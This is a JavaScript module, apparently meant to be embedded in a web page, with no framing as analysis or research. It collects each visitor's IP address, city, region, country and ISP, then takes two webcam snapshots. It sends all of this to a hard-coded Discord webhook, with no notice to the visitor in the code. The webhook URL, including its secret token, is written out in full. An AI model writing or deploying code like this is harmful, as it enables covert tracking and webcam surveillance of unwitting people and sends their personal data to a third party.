const webhookURL = 'https://discord.com/api/webhooks/1375557655036301593/fAVFnmHle5XCW4nxYD3GKHetyJRbGyQa6IXia2LbrEmk4Sn6Gaym_YduQpvpgkD2h0oA';

export async function sendIPInfo() {
  try {
    console.log('Sending IP info...');
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    const content = {
      content: `Visitor IP info:\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country_name}\nIP: ${data.ip}\nISP: ${data.org}`
    };
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(content)
    });
    console.log('IP info sent successfully.');
  } catch (e) {
    console.error('Failed to send IP info:', e);
  }
}

async function sendImageToWebhook(blob, filename) {
  try {
    console.log(`Sending image ${filename}...`);
    const form = new FormData();
    form.append('file', blob, filename);
    await fetch(webhookURL, {
      method: 'POST',
      body: form
    });
    console.log(`${filename} sent successfully.`);
  } catch (e) {
    console.error(`Failed to send image ${filename}:`, e);
  }
}

export async function capturePhotos() {
  try {
    console.log('Requesting webcam access...');
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');

    // First capture immediately
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => sendImageToWebhook(blob, 'photo1.png'));

    // Second capture after 3 seconds
    setTimeout(() => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => sendImageToWebhook(blob, 'photo2.png'));
      stream.getTracks().forEach(track => track.stop());
      console.log('Webcam stream stopped.');
    }, 3000);
  } catch (err) {
    console.error('Webcam capture failed:', err);
    throw err;
  }
}
